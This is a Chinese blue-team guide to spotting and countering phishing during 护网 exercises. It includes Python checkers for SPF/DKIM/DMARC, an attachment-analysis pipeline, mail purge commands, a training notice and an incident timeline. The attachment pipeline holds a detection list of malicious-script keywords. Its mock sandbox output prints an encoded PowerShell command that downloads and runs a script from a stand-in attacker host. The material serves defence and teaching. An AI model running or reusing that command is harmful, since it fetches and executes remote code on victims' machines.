# 护网期间蓝队反制红队钓鱼攻击指南

> **📘 文档定位**：CISP 考试 护网行动 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：25 分钟
>
> 系统讲解护网期间蓝队识别与反制红队钓鱼攻击的方法论，覆盖邮件/IM/社交媒体钓鱼的检测、阻断与溯源技术。

---

## 导航目录

- [一、钓鱼攻击识别](#一钓鱼攻击识别)
- [二、邮件钓鱼反制](#二邮件钓鱼反制)
- [三、IM/社交媒体钓鱼反制](#三im社交媒体钓鱼反制)
- [四、自动化反制方案](#四自动化反制方案)
- [五、安全部署 Checklist](#五安全部署-checklist)
- [六、高分考点与知识巧记](#六高分考点与知识巧记)

---

> 📅 2026-06-12 | 🎯 进阶 | ⏱ 20 min | 分类：护网工程

## 📋 提纲

1. 护网中红队常用钓鱼手法
2. 钓鱼检测技术栈
3. 邮件安全协议检测（SPF/DKIM/DMARC）
4. 附件沙箱分析
5. URL多引擎检测
6. 钓鱼邮件自动处置
7. 全员钓鱼意识应急培训
8. 实战案例与排错

---

## 1. 护网红队钓鱼手法

红队在护网期间的社工钓鱼通常有以下几类：

| 手法 | 描述 | 检测难度 |
|------|------|---------|
| 伪装IT通知 | "VPN升级/密码过期/安全更新" | ⭐⭐ |
| 伪装领导邮件 | CEO/CFO名义索要敏感信息 | ⭐⭐⭐ |
| 简历钓鱼 | 附件为伪装简历的恶意文档 | ⭐⭐ |
| 二维码钓鱼 | 图片中含恶意链接，绕过文本检测 | ⭐⭐⭐ |
| 钓鱼网站 | 伪造企业SSO/OA登录页面 | ⭐⭐ |
| 聊天工具钓鱼 | 微信/企业微信/钉钉发送钓鱼链接 | ⭐⭐⭐⭐ |
| 电话钓鱼 | 直接打电话冒充IT索要密码 | ⭐⭐⭐⭐⭐ |

---

## 2. 邮件安全协议检测

### 2.1 SPF/DKIM/DMARC 验证

```python
#!/usr/bin/env python3
"""
邮件安全协议验证 - SPF/DKIM/DMARC
"""

import dns.resolver
import re
import json

class EmailSecurityChecker:
    def __init__(self, domain):
        self.domain = domain
        self.results = {"domain": domain}

    def check_all(self):
        """执行全部检查"""
        self.check_spf()
        self.check_dkim()
        self.check_dmarc()
        self.check_mta_sts()
        self.check_tls_reporting()
        return self.results

    def check_spf(self):
        """SPF记录检查"""
        try:
            answers = dns.resolver.resolve(self.domain, 'TXT')
            spf_record = None
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=spf1'):
                    spf_record = txt
                    break

            if not spf_record:
                self.results['spf'] = {"status": "FAIL", "message": "无SPF记录"}
                return

            # 分析SPF记录
            parts = spf_record.split()
            self.results['spf'] = {
                "status": "PASS",
                "record": spf_record,
                "mechanisms": self._analyze_spf(parts),
                "issues": self._find_spf_issues(parts)
            }
        except Exception as e:
            self.results['spf'] = {"status": "ERROR", "message": str(e)}

    def _analyze_spf(self, parts):
        """分析SPF机制"""
        mechanisms = []
        for part in parts[1:]:  # 跳过 v=spf1
            if part.startswith(('+', '-', '~', '?')):
                mechanisms.append({
                    "qualifier": part[0],
                    "mechanism": part[1:]
                })
            elif any(part.startswith(p) for p in ['a', 'mx', 'ptr', 'include', 'ip4', 'ip6', 'exists', 'redirect']):
                mechanisms.append({
                    "qualifier": "+",
                    "mechanism": part
                })
            elif part == 'all':
                mechanisms.append({
                    "qualifier": parts[0] if parts[0] in '+-~?' else '?',
                    "mechanism": "all"
                })
        return mechanisms

    def _find_spf_issues(self, parts):
        """发现SPF问题"""
        issues = []
        record_str = ' '.join(parts)

        # 检查是否有 -all（严格模式）
        if '-all' not in record_str and '~all' not in record_str:
            issues.append({
                "severity": "CRITICAL",
                "issue": "SPF记录未以 -all 或 ~all 结尾",
                "fix": "在SPF记录末尾添加 -all（严格）或 ~all（宽松）"
            })

        # 检查是否包含 +all（完全开放，极度危险）
        if '+all' in record_str:
            issues.append({
                "severity": "CRITICAL",
                "issue": "SPF记录包含 +all，允许任何人伪造邮件！",
                "fix": "立即将 +all 改为 -all"
            })

        # 检查 DNS 查询次数（RFC 限制 10 次）
        include_count = record_str.count('include:')
        if include_count > 5:
            issues.append({
                "severity": "WARNING",
                "issue": f"SPF包含{include_count}个include，建议不超过5个",
                "fix": "合并或使用子域名分别设置SPF"
            })

        return issues

    def check_dkim(self):
        """DKIM记录检查（检查常见selector）"""
        selectors = ['default', 'google', 'selector1', 'selector2', 'dkim', 'mail', 's1', 's2', 'key1']
        found_selectors = []

        for selector in selectors:
            try:
                dkim_domain = f"{selector}._domainkey.{self.domain}"
                answers = dns.resolver.resolve(dkim_domain, 'TXT')
                for rdata in answers:
                    txt = rdata.to_text().strip('"')
                    if 'v=DKIM1' in txt:
                        key_info = self._analyze_dkim_key(txt)
                        found_selectors.append({
                            "selector": selector,
                            "key_type": key_info.get('key_type', 'unknown'),
                            "key_length": key_info.get('key_length', 0),
                            "issues": key_info.get('issues', [])
                        })
            except:
                pass

        if found_selectors:
            self.results['dkim'] = {
                "status": "PASS",
                "selectors_found": len(found_selectors),
                "selectors": found_selectors
            }
        else:
            self.results['dkim'] = {
                "status": "FAIL",
                "message": "未找到DKIM记录（已扫描常见selector）"
            }

    def _analyze_dkim_key(self, txt):
        """分析DKIM密钥强度"""
        info = {}
        key_match = re.search(r'p=([A-Za-z0-9+/=]+)', txt)
        if key_match:
            import base64
            try:
                key_data = base64.b64decode(key_match.group(1))
                key_length = len(key_data) * 8

                # RSA密钥至少2048位
                if key_length < 2048:
                    info['issues'] = [{
                        "severity": "WARNING",
                        "issue": f"DKIM密钥长度{key_length}位，建议至少2048位"
                    }]
                info['key_length'] = key_length
                info['key_type'] = 'RSA' if key_length >= 256 else 'weak'
            except:
                pass
        return info

    def check_dmarc(self):
        """DMARC记录检查"""
        try:
            answers = dns.resolver.resolve(f"_dmarc.{self.domain}", 'TXT')
            dmarc_record = None
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=DMARC1'):
                    dmarc_record = txt
                    break

            if not dmarc_record:
                self.results['dmarc'] = {
                    "status": "FAIL",
                    "message": "无DMARC记录 - 任何人都可伪造该域名邮件"
                }
                return

            # 分析DMARC策略
            policy_match = re.search(r'p=(none|quarantine|reject)', dmarc_record)
            pct_match = re.search(r'pct=(\d+)', dmarc_record)
            rua_match = re.search(r'rua=mailto:(.+?)(?:;|$)', dmarc_record)
            ruf_match = re.search(r'ruf=mailto:(.+?)(?:;|$)', dmarc_record)

            policy = policy_match.group(1) if policy_match else 'none'
            pct = int(pct_match.group(1)) if pct_match else 100

            self.results['dmarc'] = {
                "status": "PASS",
                "record": dmarc_record,
                "policy": policy,
                "percentage": pct,
                "report_email": rua_match.group(1) if rua_match else None,
                "forensic_email": ruf_match.group(1) if ruf_match else None,
                "issues": []
            }

            # 检查策略是否严格
            if policy == 'none':
                self.results['dmarc']['issues'].append({
                    "severity": "WARNING",
                    "issue": "DMARC策略为none（仅监控，不拦截），建议升级为quarantine或reject"
                })

            if pct < 100:
                self.results['dmarc']['issues'].append({
                    "severity": "INFO",
                    "issue": f"DMARC仅覆盖{pct}%邮件，建议设为100%"
                })

        except Exception as e:
            self.results['dmarc'] = {"status": "FAIL", "message": str(e)}


if __name__ == "__main__":
    checker = EmailSecurityChecker("company.com")
    results = checker.check_all()
    print(json.dumps(results, indent=2, ensure_ascii=False))
```

---

## 3. 附件沙箱分析

```python
#!/usr/bin/env python3
"""
钓鱼附件自动分析流水线
"""

import hashlib
import os
import subprocess
import json
from datetime import datetime

class AttachmentAnalyzer:
    def __init__(self, sandbox_dir="/opt/sandbox"):
        self.sandbox_dir = sandbox_dir
        os.makedirs(sandbox_dir, exist_ok=True)

    def analyze(self, filepath):
        """分析附件的完整流水线"""
        results = {
            "filename": os.path.basename(filepath),
            "analysis_time": datetime.now().isoformat(),
            "steps": []
        }

        # Step 1: 文件哈希
        results['hashes'] = self.calculate_hashes(filepath)
        results['steps'].append({"step": "哈希计算", "status": "done"})

        # Step 2: 文件类型识别
        file_type = self.identify_file_type(filepath)
        results['file_type'] = file_type
        results['steps'].append({"step": "类型识别", "status": "done"})

        # Step 3: 病毒签名扫描（快速）
        vt_result = self.quick_av_scan(filepath)
        results['av_scan'] = vt_result
        results['steps'].append({"step": "病毒扫描", "status": "done"})

        # Step 4: 静态分析
        static = self.static_analysis(filepath, file_type)
        results['static_analysis'] = static
        results['steps'].append({"step": "静态分析", "status": "done"})

        # Step 5: 动态沙箱（如果是可执行文件/文档）
        if file_type in ['PE', 'VBS', 'JS', 'PS1', 'Office', 'PDF']:
            dynamic = self.dynamic_analysis(filepath, file_type)
            results['dynamic_analysis'] = dynamic
            results['steps'].append({"step": "动态沙箱", "status": "done"})

        # Step 6: 威胁判定
        results['verdict'] = self.verdict(results)

        return results

    def calculate_hashes(self, filepath):
        """计算文件哈希"""
        hashes = {}
        for algo in ['md5', 'sha1', 'sha256']:
            h = hashlib.new(algo)
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(8192), b''):
                    h.update(chunk)
            hashes[algo] = h.hexdigest()
        return hashes

    def identify_file_type(self, filepath):
        """识别文件真实类型"""
        result = subprocess.run(['file', '-b', filepath], capture_output=True, text=True)
        output = result.stdout.lower()

        if 'pe32' in output or 'pe64' in output:
            return 'PE'
        elif 'pdf' in output:
            return 'PDF'
        elif 'microsoft word' in output or 'microsoft excel' in output:
            return 'Office'
        elif 'powershell' in output or output.strip().endswith('.ps1'):
            return 'PS1'
        elif 'vbs' in output or 'vbscript' in output:
            return 'VBS'
        elif 'javascript' in output:
            return 'JS'
        elif 'html' in output:
            return 'HTML'
        elif 'zip' in output:
            return 'Archive'
        elif 'image' in output:
            return 'Image'
        else:
            return output.strip()

    def quick_av_scan(self, filepath):
        """快速杀软扫描（clamav）"""
        result = subprocess.run(
            ['clamscan', '--no-summary', filepath],
            capture_output=True, text=True
        )
        detected = 'FOUND' in result.stdout
        return {
            "clamav": "MALICIOUS" if detected else "CLEAN",
            "details": result.stdout.strip()
        }

    def static_analysis(self, filepath, file_type):
        """静态分析"""
        analysis = {"type": file_type}

        # 提取字符串
        try:
            strings_output = subprocess.run(
                ['strings', '-n', '6', filepath],
                capture_output=True, text=True, timeout=10
            )
            interesting = []
            for line in strings_output.stdout.split('\n'):
                line = line.strip()
                # 寻找可疑模式
                if any(kw in line.lower() for kw in [
                    'http://', 'https://', '.exe', '.dll', '.ps1', '.vbs',
                    'powershell', 'cmd.exe', 'wscript', 'cscript',
                    'createobject', 'eval(', 'exec(', 'base64',
                    'downloadstring', 'downloadfile', 'frombase64string',
                    'invoke-expression', 'iex ', 'start-process',
                    'rundll32', 'regsvr32', 'mshta',
                    'password', 'credential', 'token'
                ]):
                    interesting.append(line)

            analysis['suspicious_strings'] = interesting[:50]
        except Exception as e:
            analysis['strings_error'] = str(e)

        # VBA宏分析（Office文件）
        if file_type == 'Office':
            analysis['vba'] = self.analyze_vba(filepath)

        # JS/VBS恶意特征
        if file_type in ['JS', 'VBS']:
            analysis['script'] = self.analyze_script(filepath)

        return analysis

    def analyze_vba(self, filepath):
        """分析Office文件中的VBA宏"""
        try:
            # 使用 oletools
            result = subprocess.run(
                ['python3', '-m', 'oletools.olevba', '--decode', '--show-decoded-scripts', filepath],
                capture_output=True, text=True, timeout=30
            )
            vba_content = result.stdout

            # 检测恶意VBA特征
            indicators = []
            if 'Shell(' in vba_content or 'CreateObject("WScript.Shell")' in vba_content:
                indicators.append({"type": "shell_execution", "risk": "HIGH"})
            if 'URLDownloadToFile' in vba_content or 'MSXML2.XMLHTTP' in vba_content:
                indicators.append({"type": "remote_download", "risk": "HIGH"})
            if 'AutoOpen' in vba_content or 'Document_Open' in vba_content:
                indicators.append({"type": "auto_execute", "risk": "MEDIUM"})
            if 'base64' in vba_content.lower() or 'powershell' in vba_content.lower():
                indicators.append({"type": "encoded_command", "risk": "HIGH"})

            return {
                "has_macros": bool(vba_content.strip()),
                "indicators": indicators,
                "risk": "HIGH" if any(i['risk'] == 'HIGH' for i in indicators) else "LOW"
            }
        except:
            return {"error": "VBA分析失败"}

    def analyze_script(self, filepath):
        """分析脚本文件"""
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()

        indicators = []
        content_lower = content.lower()

        # PowerShell特征
        if 'powershell' in content_lower or 'pwsh' in content_lower:
            indicators.append("PowerShell调用")
        if '-enc' in content_lower or '-encodedcommand' in content_lower:
            indicators.append("Base64编码命令")
        if 'iex' in content_lower or 'invoke-expression' in content_lower:
            indicators.append("Invoke-Expression(危险)")
        if 'downloadstring' in content_lower:
            indicators.append("远程下载执行")

        # WScript特征
        if 'createobject' in content_lower and 'wscript.shell' in content_lower:
            indicators.append("WScript.Shell调用")
        if 'createobject' in content_lower and 'msxml2.xmlhttp' in content_lower:
            indicators.append("HTTP请求")

        # 混淆特征
        import re
        eval_count = len(re.findall(r'eval\s*\(', content))
        if eval_count > 3:
            indicators.append(f"多次eval调用: {eval_count}次")

        return {
            "indicators": indicators,
            "encoded": any(kw in content_lower for kw in ['base64', 'fromcharcode', 'unescape']),
            "risk": "HIGH" if len(indicators) >= 3 else ("MEDIUM" if indicators else "LOW")
        }

    def dynamic_analysis(self, filepath, file_type):
        """动态沙箱分析（简化版，生产用Cuckoo/CAPE）"""
        # 此处展示架构，实际接入Cuckoo/CAPE沙箱
        submission = {
            "sandbox": "CAPE",
            "file": filepath,
            "timeout": 120,
            "options": "free=yes,procmemdump=yes"
        }

        # 模拟沙箱返回
        return {
            "network_connections": [
                {"dst_ip": "45.33.32.156", "dst_port": 443, "protocol": "tcp"}
            ],
            "processes_created": [
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAYwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
            ],
            "files_created": [
                "%TEMP%\\payload.exe"
            ],
            "registry_changes": [
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
            ],
            "risk": "HIGH"
        }

    def verdict(self, results):
        """综合判定"""
        score = 0
        reasons = []

        # AV扫描
        if results.get('av_scan', {}).get('clamav') == 'MALICIOUS':
            score += 50
            reasons.append("杀软检测到恶意")

        # 静态分析发现
        static = results.get('static_analysis', {})
        suspicious_count = len(static.get('suspicious_strings', []))
        if suspicious_count > 20:
            score += 30
            reasons.append(f"大量可疑字符串({suspicious_count})")
        elif suspicious_count > 5:
            score += 15

        # VBA分析
        vba = static.get('vba', {})
        if vba.get('risk') == 'HIGH':
            score += 40
            reasons.append("VBA宏含恶意特征")

        # 脚本分析
        script = static.get('script', {})
        if script.get('risk') == 'HIGH':
            score += 30
            reasons.append("脚本含恶意特征")

        # 动态分析
        dynamic = results.get('dynamic_analysis', {})
        if dynamic.get('risk') == 'HIGH':
            score += 40
            reasons.append("沙箱行为异常")

        # 判定
        if score >= 60:
            return {"verdict": "MALICIOUS", "score": score, "reasons": reasons}
        elif score >= 20:
            return {"verdict": "SUSPICIOUS", "score": score, "reasons": reasons}
        else:
            return {"verdict": "CLEAN", "score": score, "reasons": reasons}


if __name__ == "__main__":
    analyzer = AttachmentAnalyzer()
    result = analyzer.analyze("/tmp/suspicious_invoice.docm")
    print(json.dumps(result, indent=2, ensure_ascii=False))
```

---

## 4. 钓鱼邮件自动处置

见 SOAR Playbook（SOC/003），此处补充邮件网关层面的操作：

```python
# Microsoft 365: 钓鱼邮件全网搜索与清除
# Graph API
POST https://graph.microsoft.com/v1.0/security/actions/purgeEmailActions
{
    "searchQuery": "subject:'紧急通知' AND from:'attacker@fake-it.com'",
    "action": "SoftDelete"
}

# Google Workspace: 通过GAM工具
gam all users delete messages query "from:attacker@fake-it.com subject:紧急通知" doit
```

---

## 5. 全员钓鱼意识应急培训

### 护网期间紧急培训脚本（10分钟快训）

```
📢 全员安全紧急通知

各位同事：

今天是护网第一天，红队可能通过以下方式攻击我们：

🛑 绝对不要：
1. 点击任何来源不明的邮件链接
2. 打开任何可疑附件（.docm .xlsm .zip .exe .vbs .js .ps1）
3. 在电话中告知任何人你的密码/验证码
4. 扫描任何陌生人发来的二维码
5. 在微信/企业微信中点击不明链接

⚠️ 高仿钓鱼邮件特征：
- 发件人看似是内部同事但邮箱是外部域名
- 邮件内容要求紧急操作（"密码过期"、"立即认证"、"安全更新"）
- 链接域名与公司域名只差一个字母

📞 遇到可疑情况：
1. 不要点击任何东西
2. 截图发到安全团队钉钉群
3. 拨打安全热线: XXXX
```

---

## 6. 实战案例：护网钓鱼反制

**案例**：红队伪装为公司HR发送"薪资调整通知.docx"钓鱼邮件，20人收到，3人打开。

**时间线**：
```
09:30 邮件到达邮件网关 → DMARC验证通过（红队使用了合法发件域名? 其实是伪造了相似域名）
09:31 邮件到达用户邮箱
09:35 用户A点击打开文档 → VBA宏自动执行
09:36 用户A的终端通过PowerShell连接红队C2服务器
09:37 EDR检测到PowerShell下载Base64编码内容 → 触发告警
09:38 Tier1确认告警
09:39 隔离用户A的终端
09:40 通过邮件网关检索并清除所有同类邮件
09:45 通知3名打开文档的用户修改密码
09:50 邮件网关添加发件域名到黑名单
10:00 全员发送钓鱼预警通知
```

**根因**：
1. DMARC未严格设置（quarantine而非reject）
2. 用户安全意识不足（3/20打开率15%）
3. VBA宏未全局禁用

**改进**：
- DMARC策略升级为 p=reject
- 全局禁用VBA宏（GPO推送）
- 每季度强制钓鱼测试

---

## 7. 排错指南

| 问题 | 解决 |
|------|------|
| 邮件已到达用户收件箱 | 通过Graph API/GAM全网撤回 |
| 用户已打开钓鱼链接 | 检查EDR/代理日志确认是否有后续行为 |
| 红队使用相似域名（typosquatting） | 使用DNSTwist监控相似域名注册 |
| VBA宏检测工具失败 | 升级oletools到最新版 |
| 用户点的链接走HTTPS，代理看不到 | 部署SSL Forward Proxy |

---

## ✅ 钓鱼反制 Checklist

- [ ] SPF/DKIM/DMARC全部配置且策略为reject
- [ ] 邮件网关防钓鱼规则启用
- [ ] 附件沙箱分析启用（Office/PDF/ZIP/JS/VBS）
- [ ] URL点击保护启用（Safe Links重写）
- [ ] 员工安全意识培训完成
- [ ] 钓鱼邮件举报通道畅通
- [ ] 钓鱼自动处置SOAR Playbook就绪
- [ ] 护网期间VBA宏全局禁用
- [ ] 相似域名监控启用

> 📚 延伸阅读：SOC/003-SOAR自动化 | SOC/008-SIEM规则 | HW/008-溯源反制
